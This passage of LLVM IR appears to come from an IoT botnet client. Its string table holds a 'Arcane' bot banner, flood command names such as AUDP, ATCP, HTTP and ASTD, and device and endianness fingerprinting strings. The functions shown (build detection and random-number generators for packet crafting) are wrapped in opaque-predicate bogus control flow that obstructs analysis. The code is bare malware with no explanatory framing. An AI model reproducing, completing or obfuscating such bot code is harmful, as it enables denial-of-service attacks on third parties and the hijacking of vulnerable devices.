/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.128 = private unnamed_addr constant [5 x i8] c"AUDP\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"ATCP\00", align 1
@.str.130 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"ASTD\00", align 1
@.str.132 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.134 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.135 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.136 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.138 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.139 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.140 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.141 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.142 = private unnamed_addr constant [130 x i8] c"\1B[0;97m[ \1B[0;92mArcane \1B[0;97m] [ \1B[0;92m%s\1B[0;97m ] Connected = \1B[0;92m%s\1B[0;97m  | Endian \1B[0;92m%s  \1B[0;97m| Device: \1B[0;92m%s\00", align 1
@.str.143 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i8*, align 8
  %10 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %11 = icmp ne i32 %10, -1
  %12 = load i32, i32* @x.3
  %13 = load i32, i32* @y.4
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %11, label %20, label %21

; <label>:20:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i32 0, i32 0), i8** %9, align 8
  br label %30

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i32 0, i32 0), i32 0) #3
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i32 0, i32 0), i8** %9, align 8
  br label %30

; <label>:25:                                     ; preds = %21
  %26 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i32 0, i32 0), i32 0) #3
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i32 0, i32 0), i8** %9, align 8
  br label %30

; <label>:29:                                     ; preds = %25
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8** %9, align 8
  br label %30

; <label>:30:                                     ; preds = %29, %28, %24, %20
  %31 = load i8*, i8** %9, align 8
  ret i8* %31

originalBBalteredBB:                              ; preds = %originalBB, %0
  %32 = alloca i8*, align 8
  %33 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %34 = icmp ne i32 %33, -1
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x.5
  %3 = load i32, i32* @y.6
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x.5
  %19 = load i32, i32* @y.6
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart228, %originalBBpart2
  %27 = load i32, i32* @x.5
  %28 = load i32, i32* @y.6
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %26
  %35 = load i32, i32* %11, align 4
  %36 = icmp slt i32 %35, 4096
  %37 = load i32, i32* @x.5
  %38 = load i32, i32* @y.6
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %36, label %45, label %82

; <label>:45:                                     ; preds = %originalBBpart219
  %46 = load i32, i32* %11, align 4
  %47 = sub nsw i32 %46, 3
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %48
  %50 = load i32, i32* %49, align 4
  %51 = load i32, i32* %11, align 4
  %52 = sub nsw i32 %51, 2
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = xor i32 %50, %55
  %57 = xor i32 %56, -1640531527
  %58 = load i32, i32* %11, align 4
  %59 = xor i32 %57, %58
  %60 = load i32, i32* %11, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %63

; <label>:63:                                     ; preds = %45
  %64 = load i32, i32* @x.5
  %65 = load i32, i32* @y.6
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %63
  %72 = load i32, i32* %11, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %11, align 4
  %74 = load i32, i32* @x.5
  %75 = load i32, i32* @y.6
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart228, label %originalBB21alteredBB

originalBBpart228:                                ; preds = %originalBB21
  br label %26

; <label>:82:                                     ; preds = %originalBBpart219
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %83 = alloca i32, align 4
  %84 = alloca i32, align 4
  store i32 %0, i32* %83, align 4
  %85 = load i32, i32* %83, align 4
  store i32 %85, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %86 = load i32, i32* %83, align 4
  %_ = sub i32 0, %86
  %gen = add i32 %_, -1640531527
  %_1 = sub i32 %86, -1640531527
  %gen2 = mul i32 %_1, -1640531527
  %_3 = sub i32 0, %86
  %gen4 = add i32 %_3, -1640531527
  %_5 = sub i32 %86, -1640531527
  %gen6 = mul i32 %_5, -1640531527
  %_7 = sub i32 0, %86
  %gen8 = add i32 %_7, -1640531527
  %87 = add i32 %86, -1640531527
  store i32 %87, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %88 = load i32, i32* %83, align 4
  %_9 = sub i32 %88, -1640531527
  %gen10 = mul i32 %_9, -1640531527
  %_11 = shl i32 %88, -1640531527
  %89 = add i32 %88, -1640531527
  %_12 = sub i32 0, %89
  %gen13 = add i32 %_12, -1640531527
  %_14 = shl i32 %89, -1640531527
  %_15 = sub i32 %89, -1640531527
  %gen16 = mul i32 %_15, -1640531527
  %90 = add i32 %89, -1640531527
  store i32 %90, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %84, align 4
  br label %originalBB

originalBB17alteredBB:                            ; preds = %originalBB17, %26
  %91 = load i32, i32* %11, align 4
  %92 = icmp slt i32 %91, 4096
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %63
  %93 = load i32, i32* %11, align 4
  %_22 = sub i32 %93, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %93, 1
  %_25 = sub i32 %93, 1
  %gen26 = mul i32 %_25, 1
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %11, align 4
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = add i32 %38, 1
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* @c, align 4
  %41 = add i32 %40, 1
  store i32 %41, i32* @c, align 4
  %42 = load i32, i32* @x.7
  %43 = load i32, i32* @y.8
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:50:                                     ; preds = %originalBBpart2, %0
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %29
  %57 = load i32, i32* %3, align 4
  %_ = shl i32 %57, 1
  %_1 = sub i32 0, %57
  %gen = add i32 %_1, 1
  %_2 = sub i32 %57, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %57, 1
  %gen5 = mul i32 %_4, 1
  %58 = add i32 %57, 1
  store i32 %58, i32* %3, align 4
  %59 = load i32, i32* @c, align 4
  %_6 = sub i32 %59, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %59, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %59, 1
  %60 = add i32 %59, 1
  store i32 %60, i32* @c, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = load i32, i32* @x.9
  %2 = load i32, i32* @y.10
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i64 @time(i64* null) #3
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* @x, align 4
  %11 = call i32 @getpid() #3
  %12 = call i32 @getppid() #3
  %13 = xor i32 %11, %12
  store i32 %13, i32* @y, align 4
  %14 = call i64 @clock() #3
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @z, align 4
  %16 = load i32, i32* @z, align 4
  %17 = load i32, i32* @y, align 4
  %18 = xor i32 %16, %17
  store i32 %18, i32* @w, align 4
  %19 = load i32, i32* @x.9
  %20 = load i32, i32* @y.10
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %27 = call i64 @time(i64* null) #3
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @x, align 4
  %29 = call i32 @getpid() #3
  %30 = call i32 @getppid() #3
  %_ = shl i32 %29, %30
  %31 = xor i32 %29, %30
  store i32 %31, i32* @y, align 4
  %32 = call i64 @clock() #3
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @z, align 4
  %34 = load i32, i32* @z, align 4
  %35 = load i32, i32* @y, align 4
  %_1 = sub i32 0, %34
  %gen = add i32 %_1, %35
  %_2 = sub i32 0, %34
  %gen3 = add i32 %_2, %35
  %_4 = shl i32 %34, %35
  %_5 = shl i32 %34, %35
  %_6 = sub i32 %34, %35
  %gen7 = mul i32 %_6, %35
  %_8 = sub i32 %34, %35
  %gen9 = mul i32 %_8, %35
  %_10 = shl i32 %34, %35
  %_11 = shl i32 %34, %35
  %36 = xor i32 %34, %35
  store i32 %36, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.11
  %2 = load i32, i32* @y.12
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.11
  %31 = load i32, i32* @y.12
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %_ = sub i32 %40, 11
  %gen = mul i32 %_, 11
  %_1 = shl i32 %40, 11
  %_2 = sub i32 0, %40
  %gen3 = add i32 %_2, 11
  %_4 = sub i32 0, %40
  %gen5 = add i32 %_4, 11
  %_6 = sub i32 0, %40
  %gen7 = add i32 %_6, 11
  %_8 = sub i32 0, %40
  %gen9 = add i32 %_8, 11
  %_10 = sub i32 %40, 11
  %gen11 = mul i32 %_10, 11
  %_12 = sub i32 %40, 11
  %gen13 = mul i32 %_12, 11
  %_14 = shl i32 %40, 11
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_15 = sub i32 0, %42
  %gen16 = add i32 %_15, %41
  %_17 = sub i32 0, %42
  %gen18 = add i32 %_17, %41
  %_19 = shl i32 %42, %41
  %_20 = sub i32 0, %42
  %gen21 = add i32 %_20, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_22 = shl i32 %44, 8
  %_23 = shl i32 %44, 8
  %_24 = sub i32 0, %44
  %gen25 = add i32 %_24, 8
  %_26 = shl i32 %44, 8
  %_27 = shl i32 %44, 8
  %_28 = sub i32 %44, 8
  %gen29 = mul i32 %_28, 8
  %_30 = sub i32 0, %44
  %gen31 = add i32 %_30, 8
  %_32 = sub i32 0, %44
  %gen33 = add i32 %_32, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_34 = shl i32 %46, %45
  %_35 = sub i32 0, %46
  %gen36 = add i32 %_35, %45
  %_37 = shl i32 %46, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_38 = shl i32 %51, 19
  %_39 = sub i32 0, %51
  %gen40 = add i32 %_39, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_41 = sub i32 %53, %52
  %gen42 = mul i32 %_41, %52
  %_43 = shl i32 %53, %52
  %_44 = shl i32 %53, %52
  %_45 = shl i32 %53, %52
  %_46 = sub i32 0, %53
  %gen47 = add i32 %_46, %52
  %_48 = sub i32 0, %53
  %gen49 = add i32 %_48, %52
  %_50 = sub i32 0, %53
  %gen51 = add i32 %_50, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_52 = shl i32 %56, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* @x.13
  %14 = load i32, i32* @y.14
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %originalBBpart216, %originalBBpart2
  %22 = load i32, i32* %12, align 4
  %23 = icmp sgt i32 %22, 0
  br i1 %23, label %24, label %110

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* @x.13
  %26 = load i32, i32* @y.14
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i32, i32* %12, align 4
  %34 = icmp sge i32 %33, 4
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %34, label %43, label %69

; <label>:43:                                     ; preds = %originalBBpart24
  %44 = load i32, i32* @x.13
  %45 = load i32, i32* @y.14
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %43
  %52 = call i32 @rand_next()
  %53 = load i8*, i8** %11, align 8
  %54 = bitcast i8* %53 to i32*
  store i32 %52, i32* %54, align 4
  %55 = load i8*, i8** %11, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 4
  store i8* %56, i8** %11, align 8
  %57 = load i32, i32* %12, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 %58, 4
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* @x.13
  %62 = load i32, i32* @y.14
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br label %93

; <label>:69:                                     ; preds = %originalBBpart24
  %70 = load i32, i32* %12, align 4
  %71 = icmp sge i32 %70, 2
  br i1 %71, label %72, label %84

; <label>:72:                                     ; preds = %69
  %73 = call i32 @rand_next()
  %74 = and i32 %73, 65535
  %75 = trunc i32 %74 to i16
  %76 = load i8*, i8** %11, align 8
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 2
  %78 = load i8*, i8** %11, align 8
  %79 = getelementptr inbounds i8, i8* %78, i64 2
  store i8* %79, i8** %11, align 8
  %80 = load i32, i32* %12, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 %81, 2
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %12, align 4
  br label %92

; <label>:84:                                     ; preds = %69
  %85 = call i32 @rand_next()
  %86 = and i32 %85, 255
  %87 = trunc i32 %86 to i8
  %88 = load i8*, i8** %11, align 8
  %89 = getelementptr inbounds i8, i8* %88, i32 1
  store i8* %89, i8** %11, align 8
  store i8 %87, i8* %88, align 1
  %90 = load i32, i32* %12, align 4
  %91 = add nsw i32 %90, -1
  store i32 %91, i32* %12, align 4
  br label %92

; <label>:92:                                     ; preds = %84, %72
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart212
  %94 = load i32, i32* @x.13
  %95 = load i32, i32* @y.14
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %93
  %102 = load i32, i32* @x.13
  %103 = load i32, i32* @y.14
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
